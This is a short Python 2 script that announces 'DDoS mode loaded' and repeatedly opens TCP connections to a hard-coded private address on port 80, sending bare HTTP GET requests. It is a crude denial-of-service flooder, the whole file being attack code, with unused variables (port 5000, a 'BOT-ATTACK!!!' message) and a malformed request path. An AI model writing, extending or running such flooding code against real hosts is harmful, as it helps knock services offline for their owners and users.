import time, socket, os, sys, string

print ("DDoS mode loaded")
host='10.108.229.24'
ip='10.108.229.24'
port=5000
message="BOT-ATTACK!!!"
conn = 5

def dos():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
    s.connect((host, 80))  
    print ">> GET /" + host + " HTTP/1.1"  
    s.send("GET /" + host + " HTTP/1.1\r\n")  
    s.send("Host: " + host  + "\r\n\r\n");  
    s.close()

for i in xrange(conn):
    dos()
